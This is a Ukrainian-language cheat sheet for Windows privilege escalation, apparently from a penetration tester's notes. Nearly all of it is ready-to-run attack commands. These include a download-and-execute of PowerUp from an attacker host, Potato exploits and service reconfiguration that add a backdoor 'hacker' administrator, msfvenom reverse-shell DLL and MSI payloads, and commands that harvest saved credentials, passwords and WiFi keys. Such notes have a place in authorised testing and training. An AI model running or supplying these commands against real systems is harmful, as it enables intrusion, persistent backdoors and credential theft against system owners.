# Windows PrivEsc

## Автоматика
```powershell
.\winPEASany.exe
# або PowerUp:
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/PowerUp.ps1'); Invoke-AllChecks
```

---

## Token Impersonation → Potato Exploits

```cmd
whoami /priv
```
Якщо `SeImpersonatePrivilege` або `SeAssignPrimaryTokenPrivilege` — Enabled:

```powershell
# GodPotato (всі Windows, .NET 4):
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"

# PrintSpoofer (Windows 10 / Server 2016-2019):
.\PrintSpoofer.exe -i -c cmd

# JuicyPotato (старі ОС: Server 2008-2016):
.\JuicyPotato.exe -l 9999 -p cmd.exe -a "/c net user hacker P@ss123! /add" -t *

# SweetPotato — для середовищ без SeImpersonate (через PrintSpooler):
.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c ..."
```

---

## Слабкі права на сервіс (Service Misconfig)

```cmd
# Знайди сервіси з writable бінарниками або unquoted paths:
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
# Unquoted service path:
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
# Заміна бінарника сервісу:
copy evil.exe "C:\Path With Spaces\service.exe"
sc stop <service> && sc start <service>
# Або зміни binpath через sc:
sc config <service> binpath= "cmd.exe /c net user hacker P@ss123! /add"
sc start <service>
```

---

## DLL Hijacking

```powershell
# Знайди відсутні DLL які програма намагається завантажити:
.\procmon.exe  # фільтр: Result=NAME NOT FOUND, Path ends with .dll
# або Process Hacker + Modules tab
# Скопіюй свою DLL у пріоритетну директорію (перед системною у PATH):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f dll -o missing.dll
copy missing.dll "C:\writable\path\missing.dll"
```

---

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status"
# Знайди задачі які запускаються від SYSTEM і чий бінарник ти можеш замінити:
icacls "C:\path\to\task-binary.exe"
```

---

## Registry Autoruns

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# AlwaysInstallElevated (→ MSI від SYSTEM):
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Якщо обидва = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## Пошук кредів у Windows

```powershell
# Збережені Windows Credentials:
cmdkey /list
# Запуск від іншого юзера зі збереженими кредами:
runas /savecred /user:<domain>\<user> "cmd.exe /c ..."

# Пошук паролів у файлах:
findstr /si "password" *.txt *.xml *.ini *.config *.ps1
dir /s /b *pass* *cred* *vnc* *.config* 2>nul

# Реєстр:
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

# PowerShell history:
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Web.config / IIS:
type C:\inetpub\wwwroot\web.config | findstr "password connectionString"

# Unattend.xml (залишки від установки):
dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml 2>nul

# WiFi паролі:
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

---

## Missing Patches (KB)

```cmd
systeminfo
# або:
wmic qfe get Caption,Description,HotFixID,InstalledOn
# Порівняй з Windows Exploit Suggester:
python3 wes.py systeminfo.txt
```

**Зв'язки:** [[Credential-Dumping]] · [[Bypasses]] · [[Credentials]] · [[Lateral-Movement]]
